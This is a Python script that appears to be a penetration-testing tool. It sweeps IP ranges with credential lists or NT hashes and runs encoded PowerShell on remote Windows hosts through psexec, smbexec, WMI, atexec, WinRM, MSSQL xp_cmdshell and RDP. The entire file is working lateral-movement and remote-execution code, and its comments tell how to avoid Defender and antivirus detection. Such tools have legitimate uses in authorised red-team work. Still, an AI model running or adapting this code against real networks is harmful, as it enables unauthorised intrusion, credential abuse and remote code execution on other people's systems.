#!/usr/bin/env python3
import subprocess
import os
import base64
import sys
import shlex
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import argparse
import shutil
import socket

EXEC_TIMEOUT = 20
RDP_TIMEOUT = 45
MAX_THREADS = 10

VERBOSE = False
OUTPUT = False
RUN_ALL = True
SKIP_PORTSCAN = False
TOOLS_SPECIFIED = False
LINUX_MODE = False
DRY_RUN = False

VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
NXC_TOOLS = {"smbexec", "wmi", "ssh", "rdp"}

IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
NXC_CMD = "nxc"
WINRM_CMD = "evil-winrm"

print_lock = threading.Lock()

# ANSI color codes
class C:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"

def print_section(title):
    """Print a boxed section header like enum4linux-ng."""
    width = 60
    with print_lock:
        print()
        print(f" {'=' * width}")
        print(f"|    {title.ljust(width - 5)}|")
        print(f" {'=' * width}")

def print_success(msg, indent=0):
    """Print success message in green."""
    prefix = "    " * indent
    with print_lock:
        print(f"{prefix}{C.GREEN}[+]{C.RESET} {msg}")

def print_error(msg, indent=0):
    """Print error message in red."""
    prefix = "    " * indent
    with print_lock:
        print(f"{prefix}{C.RED}[-]{C.RESET} {msg}")

def print_warning(msg, indent=0):
    """Print warning message in yellow."""
    prefix = "    " * indent
    with print_lock:
        print(f"{prefix}{C.YELLOW}[!]{C.RESET} {msg}")

def print_info(msg, indent=0):
    """Print info message in cyan."""
    prefix = "    " * indent
    with print_lock:
        print(f"{prefix}{C.CYAN}[*]{C.RESET} {msg}")

def print_verbose(msg, indent=0):
    """Print verbose message in magenta (only if VERBOSE enabled)."""
    if VERBOSE:
        prefix = "    " * indent
        with print_lock:
            print(f"{prefix}{C.MAGENTA}[v]{C.RESET} {msg}")

def print_output(msg):
    """Print command output (only if OUTPUT enabled and not VERBOSE)."""
    if OUTPUT and not VERBOSE:
        with print_lock:
            print(msg)

def print_table_header():
    """Print the tool results table header."""
    with print_lock:
        print(f"    {'Service':<12} {'Auth':<8} {'Exec':<10} {'Notes'}")
        print(f"    {'─' * 12} {'─' * 8} {'─' * 10} {'─' * 25}")

def print_tool_result(tool, status, message=None):
    """Print a table row for tool result."""
    tool_padded = tool.ljust(12)
    with print_lock:
        if status == "success":
            print(f"    {tool_padded} {C.GREEN}{'OK':<8}{C.RESET} {C.GREEN}{'OK':<10}{C.RESET}")
        elif status == "error":
            note = message if message else ""
            print(f"    {tool_padded} {C.RED}{'FAILED':<8}{C.RESET} {C.RED}{'-':<10}{C.RESET} {note}")
        elif status == "warning":
            note = message.replace("AUTH OK, ", "").replace("AUTH OK ", "") if message else ""
            print(f"    {tool_padded} {C.GREEN}{'OK':<8}{C.RESET} {C.RED}{'FAILED':<10}{C.RESET} {note}")
        elif status == "skip":
            note = message if message else ""
            print(f"    {tool_padded} {C.BLUE}{'-':<8}{C.RESET} {C.BLUE}{'-':<10}{C.RESET} {note}")


def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]

def is_nthash(credential):
    cred = credential.lstrip(':').replace("'", "")
    if len(cred) == 32:
        try:
            int(cred, 16)
            return True
        except ValueError:
            return False
    return False


def load_credential_file(path):
    """
    Load credentials from file with colon-separated format:
    user1:password1
    user2:password2
    ...

    Blank lines and lines starting with # are ignored.
    Only the first colon is used as delimiter (passwords may contain colons).
    For hashes, use the hash directly as the password.
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [line.rstrip("\n\r") for line in f]
    except Exception as e:
        print_error(f"Cannot read credential file '{path}': {e}")
        sys.exit(1)
    creds = []

    for line_num, line in enumerate(lines, 1):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue

        if ':' not in line:
            raise SystemExit(f"Credential file line {line_num}: missing colon delimiter. Expected format: username:password")

        user, cred = line.split(':', 1)
        creds.append((user.strip(), cred))

    return creds


def load_values_from_file(path):
    """
    Load values from a file (one per line).
    Blank lines and lines starting with # are ignored.
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [line.rstrip("\n\r") for line in f]
    except Exception as e:
        print_error(f"Cannot read file '{path}': {e}")
        sys.exit(1)

    values = []
    for line in lines:
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            values.append(stripped)

    return values


def resolve_argument(value):
    """
    If value is a path to an existing file, load values from it.
    Otherwise return the value as a single-item list.
    """
    if os.path.isfile(value):
        return load_values_from_file(value)
    return [value]

def normalize_tool_name(name):
    """Normalize tool name aliases to canonical form."""
    name = name.lower().strip()
    if name in ("evilwinrm", "evil-winrm"):
        return "winrm"
    return name


def parse_tools_list(tools_str):
    """Parse comma-separated list of tools, validating each one."""
    tools = []
    for t in tools_str.split(','):
        normalized = normalize_tool_name(t)
        if normalized not in VALID_TOOLS:
            print_error(f"Invalid tool '{t}'. Valid options: {', '.join(VALID_TOOLS)}")
            sys.exit(1)
        if normalized not in tools:
            tools.append(normalized)
    return tools

def check_port(ip, port, timeout=1):
    """Check if a port is open on the given IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def scan_ports_for_tools(ip, tool_list):
    """
    Scan ports for given tools and return viable tools.
    For winrm, checks port 5985 for winrm and 5986 for winrm-ssl.
    Returns tuple of (viable_tools, open_ports)
    """
    viable_tools = []
    open_ports = []
    
    TOOL_PORTS = {"psexec": 445, "smbexec": 445, "atexec": 445, "wmi": 135, "rdp": 3389, "mssql": 1433, "ssh": 22, "winrm": 5985,"winrm-ssl": 5986}
    
    tools_to_check = tool_list if tool_list else VALID_TOOLS
    
    for tool in tools_to_check:
        # Check both winrm ports
        if tool == "winrm":
            if check_port(ip, 5985):
                viable_tools.append("winrm")
                if 5985 not in open_ports:
                    open_ports.append(5985)
            if check_port(ip, 5986):
                viable_tools.append("winrm-ssl")
                if 5986 not in open_ports:
                    open_ports.append(5986)
        elif tool in TOOL_PORTS:
            port = TOOL_PORTS[tool]
            if check_port(ip, port):
                viable_tools.append(tool)
                if port not in open_ports:
                    open_ports.append(port)
    
    return viable_tools, open_ports

def build_cmd(tool, user, target, credential, command):
    b64 = base64.b64encode(command.encode("utf-16le")).decode()
    use_hash = is_nthash(credential)
    hash_val = credential.lstrip(':').replace("'", "")
    quoted_user = shlex.quote(user)
    quoted_cred = shlex.quote(credential)
    # For impacket tools, quote the entire user:pass@target string
    impacket_auth = shlex.quote(f"{user}:{credential}@{target}")
    impacket_auth_hash = f"{quoted_user}@{target}"

    # For nxc tools, add --no-output unless -o was passed
    nxc_output_flag = "" if OUTPUT else " --no-output"

    # Impacket tools
    if tool == "psexec":
        cmd = impacket_cmd("psexec")
        return (f"{cmd} -hashes :{hash_val} {impacket_auth_hash} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} {impacket_auth} 'powershell -enc {b64}'")

    if tool == "mssql":
        cmd = impacket_cmd("mssqlclient")
        return (f"{cmd} -hashes :{hash_val} {impacket_auth_hash} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'"
                if use_hash else
                f"{cmd} {impacket_auth} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'")

    if tool == "atexec":
        cmd = impacket_cmd("atexec")
        return (f"{cmd} -hashes :{hash_val} {impacket_auth_hash} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} {impacket_auth} 'powershell -enc {b64}'")

    # winrm handling - both regular and SSL variants
    # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved itself more dependable
    if tool == "winrm":
        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u {quoted_user} -H {hash_val}"
                if use_hash else
                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u {quoted_user} -p {quoted_cred}")

    if tool == "winrm-ssl":
        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u {quoted_user} -H {hash_val} --ssl"
                if use_hash else
                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u {quoted_user} -p {quoted_cred} --ssl")

    # NXC tools
    if tool == "smbexec":
        return (f"{NXC_CMD} smb {target} -H {hash_val} -u {quoted_user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                if use_hash else
                f"{NXC_CMD} smb {target} -p {quoted_cred} -u {quoted_user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")

    if tool == "wmi":
        # we don't actually need to pass the --no-output here, as defender won't catch it with this specific `cmd /c "powershell -enc` combo
        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution for wmi specifically
        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u {quoted_user} -X 'cmd /c \"powershell -enc {b64}\"'"
                if use_hash else
                f"{NXC_CMD} wmi {target} -p {quoted_cred} -u {quoted_user} -X 'cmd /c \"powershell -enc {b64}\"'")

    if tool == "ssh":
        if LINUX_MODE:
            b64 = base64.b64encode(command.encode("utf-8")).decode()
            return f"{NXC_CMD} ssh {target} -p {quoted_cred} -u {quoted_user} -x 'echo {b64} | base64 -d | $0'{nxc_output_flag}"
        return f"{NXC_CMD} ssh {target} -p {quoted_cred} -u {quoted_user} -x 'powershell -enc {b64}'{nxc_output_flag}"

    if tool == "rdp":
        return (f"{NXC_CMD} rdp {target} -u {quoted_user} -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                if use_hash else
                f"{NXC_CMD} rdp {target} -u {quoted_user} -p {quoted_cred} -X 'powershell -enc {b64}'{nxc_output_flag}")

    raise Exception(f"Unknown tool: {tool}")

def run_chain(user, ip, credential, command, tool_list=None):
    """Returns (success_tool, out, cmd, auth_successes) or (None, None, None, auth_successes)"""
    chain = tool_list if tool_list else VALID_TOOLS
    auth_successes = []  # Track tools where auth succeeded but exec failed

    # test both winrm types
    if TOOLS_SPECIFIED:
        expanded_chain = []
        for tool in chain:
            if tool == "winrm":
                expanded_chain.extend(["winrm", "winrm-ssl"])
            elif tool not in expanded_chain:  # Avoid duplicates
                expanded_chain.append(tool)
        chain = expanded_chain

    for tool in chain:
        # Can't pass the hash with SSH
        if tool == "ssh" and is_nthash(credential):
            print_tool_result(tool, "skip", "cannot pass the hash")
            continue

        if tool == "rdp" and NXC_CMD == "crackmapexec":
            print_tool_result(tool, "skip", "crackmapexec doesn't support RDP exec")
            continue

        if tool == "mssql":
            print_verbose(f"Attempting to enable xp_cmdshell on {ip}...")

        cmd = build_cmd(tool, user, ip, credential, command)

        # Dry-run mode: just show the command, don't execute
        if DRY_RUN:
            with print_lock:
                print(f"    {C.CYAN}{tool}{C.RESET}")
                print(f"      {C.YELLOW}${C.RESET} {cmd}")
                print()
            continue

        print_verbose(f"Command: {cmd}")

        try:
            timeout = RDP_TIMEOUT if tool == "rdp" else EXEC_TIMEOUT
            result = subprocess.run(cmd, shell=True, timeout=timeout, capture_output=True)
            rc = result.returncode
            out = result.stdout.decode("utf-8", errors="ignore")
            print_verbose(f"Output (rc={rc}): {out if out else '(empty)'}")

        except subprocess.TimeoutExpired:
            print_tool_result(tool, "error", "timed out")
            continue

        # psexec can have "[-]" in stdout if some shares are writeable and others aren't
        if tool == "psexec":
            if "Found writable share" in out:
                if "Stopping service" in out:
                    if RUN_ALL:
                        print_tool_result(tool, "success")
                        print_output(out)
                        continue
                    return (tool, out, cmd)
                else:
                    print_tool_result(tool, "warning", "AUTH OK, but timed out (likely AV)")
                    auth_successes.append(tool)
                    continue
            elif "is not writable" in out or "Requesting shares" in out:
                # Auth succeeded but no writable shares found
                print_tool_result(tool, "warning", "AUTH OK, no writable shares")
                auth_successes.append(tool)
                continue
            else:
                print_tool_result(tool, "error")
                continue

        if tool == "atexec":
            if "rpc_s_access_denied" in out:
                print_tool_result(tool, "warning", "AUTH OK, task creation denied")
                auth_successes.append(tool)
                continue
            elif "[-]" in out:
                print_tool_result(tool, "error")
                continue

        if tool == "rdp":
            if "[-] Clipboard" in out:
                print_tool_result(tool, "warning", "AUTH OK, clipboard init failed")
                auth_successes.append(tool)
                continue
            elif "unrecognized arguments" in out:
                print_tool_result(tool, "error", "NetExec outdated, reinstall for RDP support")
                continue
            elif "[-]" in out:
                print_tool_result(tool, "error")
                continue
            # RDP with -X and --no-output returns empty on failure - do auth check
            elif rc != 0 or out == "":
                # Run auth-only check to see if RDP access exists
                auth_cmd = f"{NXC_CMD} rdp {ip} -u {shlex.quote(user)} -p {shlex.quote(credential)}"
                if is_nthash(credential):
                    hash_val = credential.lstrip(':').replace("'", "")
                    auth_cmd = f"{NXC_CMD} rdp {ip} -u {shlex.quote(user)} -H {hash_val}"
                print_verbose(f"RDP exec failed, checking auth: {auth_cmd}")
                try:
                    auth_result = subprocess.run(auth_cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
                    auth_out = auth_result.stdout.decode("utf-8", errors="ignore")
                    print_verbose(f"Auth check output: {auth_out}")
                    if "[+]" in auth_out and "[-]" not in auth_out:
                        print_tool_result(tool, "warning", "AUTH OK, exec failed. Try manual RDP.")
                        auth_successes.append(tool)
                        continue
                except Exception:
                    pass
                print_tool_result(tool, "error")
                continue

        if tool in NXC_TOOLS:
            if '[-]' in out:
                if "Could not retrieve" in out:
                    print_tool_result(tool, "warning", "AUTH OK, command failed (try without -o)")
                    auth_successes.append(tool)
                else:
                    print_tool_result(tool, "error")
                continue
            if tool == "ssh" and 'Linux - Shell' in out and not LINUX_MODE:
                print_tool_result(tool, "warning", "AUTH OK, Linux detected. Use --linux")
                auth_successes.append(tool)
                continue
            if '[+]' in out and '[+] Executed' not in out:
                print_tool_result(tool, "warning", "AUTH OK, command failed (check permissions)")
                auth_successes.append(tool)
                continue
            # WMI with empty output - do auth check like RDP
            if tool == "wmi" and (rc != 0 or out == ""):
                auth_cmd = f"{NXC_CMD} smb {ip} -u {shlex.quote(user)} -p {shlex.quote(credential)}"
                if is_nthash(credential):
                    hash_val = credential.lstrip(':').replace("'", "")
                    auth_cmd = f"{NXC_CMD} smb {ip} -u {shlex.quote(user)} -H {hash_val}"
                print_verbose(f"WMI exec failed, checking SMB auth: {auth_cmd}")
                try:
                    auth_result = subprocess.run(auth_cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
                    auth_out = auth_result.stdout.decode("utf-8", errors="ignore")
                    print_verbose(f"Auth check output: {auth_out}")
                    if "[+]" in auth_out and "[-]" not in auth_out:
                        print_tool_result(tool, "warning", "AUTH OK, WMI exec failed")
                        auth_successes.append(tool)
                        continue
                except Exception:
                    pass
                print_tool_result(tool, "error")
                continue
            # SSH with empty output - do auth check
            if tool == "ssh" and (rc != 0 or out == ""):
                auth_cmd = f"{NXC_CMD} ssh {ip} -u {shlex.quote(user)} -p {shlex.quote(credential)}"
                print_verbose(f"SSH exec failed, checking auth: {auth_cmd}")
                try:
                    auth_result = subprocess.run(auth_cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
                    auth_out = auth_result.stdout.decode("utf-8", errors="ignore")
                    print_verbose(f"Auth check output: {auth_out}")
                    if "[+]" in auth_out and "[-]" not in auth_out:
                        print_tool_result(tool, "warning", "AUTH OK, command exec failed")
                        auth_successes.append(tool)
                        continue
                except Exception:
                    pass
                print_tool_result(tool, "error")
                continue
            if rc == 0 and out == "":
                print_tool_result(tool, "error")
                continue

        if tool == "mssql":
            if "The EXECUTE permission was denied" in out:
                print_tool_result(tool, "warning", "AUTH OK, command denied (check permissions)")
                auth_successes.append(tool)
                continue
            if "ERROR" in out:
                print_tool_result(tool, "error")
                continue

        # one-shotting using evil-winrm results in a return code of 1
        if rc == 0 or (tool in ("winrm", "winrm-ssl") and rc == 1 and "NoMethodError" in out):
            if RUN_ALL:
                print_tool_result(tool, "success")
                print_output(out)
                continue
            return (tool, out, cmd, auth_successes)

        print_tool_result(tool, "error")

    return (None, None, None, auth_successes)

def execute_on_ip(username, ip, credential, command, tool_list=None):
    # Print target header
    with print_lock:
        print(f"\n{C.CYAN}[Target]{C.RESET} {ip} | {C.CYAN}User:{C.RESET} {username}")

    if SKIP_PORTSCAN:
        print_verbose("Skipping portscan (--skip-portscan enabled)")
        viable_tools = tool_list if tool_list else VALID_TOOLS
    else:
        viable_tools, open_ports = scan_ports_for_tools(ip, tool_list)
        print_verbose(f"Open ports: {sorted(open_ports)}")

        if not viable_tools:
            print_error("No ports open - target down or firewalled")
            return (ip, None)

        display_tools = ["winrm" if t == "winrm-ssl" else t for t in viable_tools]
        display_tools = list(dict.fromkeys(display_tools))
        print_verbose(f"Viable tools: {', '.join(display_tools)}")

    if DRY_RUN:
        run_chain(username, ip, credential, command, viable_tools)
        return (ip, None)

    print_table_header()
    tool, out, cmd, auth_successes = run_chain(username, ip, credential, command, viable_tools)

    if RUN_ALL:
        return (ip, None)

    if tool is None:
        if auth_successes:
            with print_lock:
                print(f"    {C.YELLOW}[!]{C.RESET} No command execution, but valid creds for: {C.GREEN}{', '.join(auth_successes)}{C.RESET}")
        else:
            print_error("All methods failed")
        return (ip, None)

    print_tool_result(tool, "success")
    print_verbose(f"Command: {cmd}")
    if tool == "mssql":
        print_warning(f"xp_cmdshell is now enabled on {ip}")
    print_output(out)
    if not RUN_ALL:
        return (ip, tool)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Execute commands across an IP range using multiple Windows RCE methods",
        formatter_class=argparse.RawTextHelpFormatter,
        usage="%(prog)s ip_range username credential command [-h] [-v] [-o] [--threads NUM_THREADS] [--timeout TIMEOUT_SECONDS] [--tools LIST] [--run-all] [--skip-portscan] [-f CRED_FILE]"
    )

    parser.add_argument("-v", action="store_true", help="Verbose output")
    parser.add_argument("-o", action="store_true", help="Show successful command output")
    parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=15, help="Number of seconds before commands timeout")
    parser.add_argument("--tools", metavar="LIST", help="Comma-separated list of tools to try")
    parser.add_argument("--first", action="store_true", help="Stop after first successful execution (default: try all tools)")
    parser.add_argument("--skip-portscan", action="store_true", help="Skip port scanning and attempt all tools")
    parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (username:password per line, colon-separated)")

    parser.add_argument("--linux", action="store_true", help="Linux-only mode - automates SSH, ignores other tools")
    parser.add_argument("--dry-run", action="store_true", help="Show commands without executing them")

    parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
    parser.add_argument("username", nargs="?", help="Username or file containing usernames (one per line)")
    parser.add_argument("credential", nargs="?", help="Password/NT hash or file containing credentials (one per line)")
    parser.add_argument("command", nargs="*", help="Command to run (default: whoami)")

    args = parser.parse_args()

    if args.file and (args.username or args.credential):
        parser.error("Cannot specify username/password when using -f")

    if not args.file and (not args.username or not args.credential):
        parser.error("Must supply either -f FILE or username and credential")

    return args



def check_dependencies():
    """Check if required tools are installed."""
    global IMPACKET_PREFIX, NXC_CMD, WINRM_CMD

    # Check impacket (either impacket-psexec or psexec.py)
    r1 = shutil.which("impacket-psexec")
    r2 = shutil.which("psexec.py")
    if r1:
        IMPACKET_PREFIX = "impacket-"
    elif r2:
        IMPACKET_PREFIX = ""
    elif not LINUX_MODE:
        print_error("impacket not found. Install with: pipx install impacket")
        sys.exit(1)
    
    # Check nxc/crackmapexec
    r1 = shutil.which("nxc")
    r2 = shutil.which("netexec")
    r3 = shutil.which("crackmapexec")
    if r1:
        NXC_CMD = "nxc"
    elif r2:
        NXC_CMD = "netexec"
    elif r3:
        NXC_CMD = "crackmapexec"
    else:
        print_error("netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
        sys.exit(1)

    # Check evil-winrm
    if shutil.which("evil-winrm"):
        WINRM_CMD = "evil-winrm"
    else:
        # default in exegol
        base = "/usr/local/rvm/gems"
        if os.path.isdir(base):
            for d in os.listdir(base):
                if d.endswith("@evil-winrm"):
                    WINRM_CMD = f"{base}/{d}/wrappers/evil-winrm"
                    break
    if not WINRM_CMD and not LINUX_MODE:
        print_error("evil-winrm not found. Install with: gem install evil-winrm")
        sys.exit(1)
    
def impacket_cmd(tool):
    """Return the correct impacket command name based on install type."""
    if IMPACKET_PREFIX:
        return f"impacket-{tool}"
    return f"{tool}.py"

def main():
    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED, LINUX_MODE, DRY_RUN

    check_dependencies()

    args = parse_args()

    VERBOSE = args.v
    OUTPUT = args.o
    MAX_THREADS = args.threads if args.threads > 0 else 1
    EXEC_TIMEOUT = args.timeout
    RUN_ALL = not args.first  # Default is to run all tools
    SKIP_PORTSCAN = args.skip_portscan
    LINUX_MODE = args.linux
    DRY_RUN = args.dry_run

    if args.file:
        credential_list = load_credential_file(args.file)
    else:
        usernames = resolve_argument(args.username)
        credentials = resolve_argument(args.credential)
        credential_list = [(u, c) for u in usernames for c in credentials]

    if args.ip_range.endswith('.txt'):
        ips = []
        with open(args.ip_range) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    ips.extend(parse_ip_range(line))
    else:
        ips = parse_ip_range(args.ip_range)

    if len(ips) < MAX_THREADS and not args.threads:
        MAX_THREADS = len(ips)

    if args.linux:
        if args.tools:
            print_warning("Tools (--tools) cannot be specified alongside Linux-mode (--linux), as only SSH is supported. Continuing with SSH...")
        args.tools = "ssh"

    if args.tools:
        tool_list = parse_tools_list(args.tools)
        TOOLS_SPECIFIED = True
    else:
        tool_list = None

    command = " ".join(args.command) if args.command else "whoami"

    # Print configuration section
    print_section("Configuration")
    print_info(f"Targets: {len(ips)} IP(s)")
    print_info(f"Credentials: {len(credential_list)} set(s)")
    print_info(f"Threads: {MAX_THREADS}")
    print_info(f"Command: {command}")
    if tool_list:
        print_info(f"Tools: {', '.join(tool_list)}")
    if DRY_RUN:
        print_warning("DRY-RUN MODE - Commands will be shown but not executed.")
    if args.skip_portscan:
        print_warning("Port scanning disabled (--skip-portscan). All tools will be attempted.")
    if not OUTPUT and not DRY_RUN:
        print_warning("Output disabled. Run with -o to see successful command output.")
    elif not LINUX_MODE and not DRY_RUN:
        print_warning("Output enabled. This WILL trip AV for certain tools.")

    print_section("Execution")

    futures = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for ip in ips:
            for (user, cred) in credential_list:
                futures.append(
                    executor.submit(execute_on_ip, user, ip, cred, command, tool_list)
                )

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print_warning(f"Exception: {e}")

    print_section("Complete")

if __name__ == "__main__":
    main()